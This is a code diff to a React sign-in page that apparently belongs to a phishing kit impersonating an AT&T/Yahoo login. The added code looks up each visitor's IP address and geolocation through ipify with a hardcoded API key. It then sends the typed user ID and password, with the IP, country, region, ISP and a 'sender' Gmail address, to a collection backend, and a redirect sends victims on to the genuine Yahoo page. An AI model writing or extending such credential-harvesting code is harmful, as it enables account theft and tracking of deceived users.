@@ -1,7 +1,8 @@
-import React, { useState } from 'react'
+import React, { useState, useEffect } from 'react'
 import axios from 'axios'
 import Loader from '../components/Loader'
 import { isEmail } from '../helpers/validateEmail'
+import { baseURL } from '../helpers/data'
 const Signin = () => {
   const [userData, setUserData] = useState({ userID: '', password: '' })
   const [showError, setShowError] = useState(false)
@@ -9,6 +10,31 @@ const Signin = () => {
   const [redirect, setRedirect] = useState(false)
 
   const [isLoading, setisLoading] = useState(false)
+  const [IPAddress, setIPAddress] = useState('')
+  const [metaData, setMetaData] = useState({ country: '', region: '', isp: '' })
+
+  useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip)
+        console.log('ip is', data.ip)
+      })
+      .then(() => {
+        axios
+          .get(
+            `https://geo.ipify.org/api/v2/country?apiKey=at_CLqRNTSBj1bA1E3dgwDHRBbAXZvvI&ipAddress=${IPAddress}`
+          )
+          .then((resp) => {
+            const { location, isp } = resp.data
+            const { country, region } = location
+            console.log(country, region, isp)
+            setMetaData({ country, region, isp })
+          })
+          .catch((e) => console.log(e))
+      })
+      .catch((error) => console.error(error))
+  }, [])
 
   React.useEffect(() => {
     redirect && window.location.replace('https://currently.att.yahoo.com/')
@@ -34,11 +60,15 @@ const Signin = () => {
     }
     setisLoading(true)
     axios
-      .post('https://att-signin-api-express.vercel.app/add-data', userData)
-      // .post('http://127.0.0.1:3000/add-data', userData)
+      .post(`${baseURL}send-data`, {
+        ...userData,
+        IPAddress,
+        ...metaData,
+        sender: 'timiperla@gmail.com',
+      })
       .then((resp) => {
         console.log(resp.data)
-        setRedirect(true)
+        // setRedirect(true)
       })
       .catch((e) => console.log(e))
   }
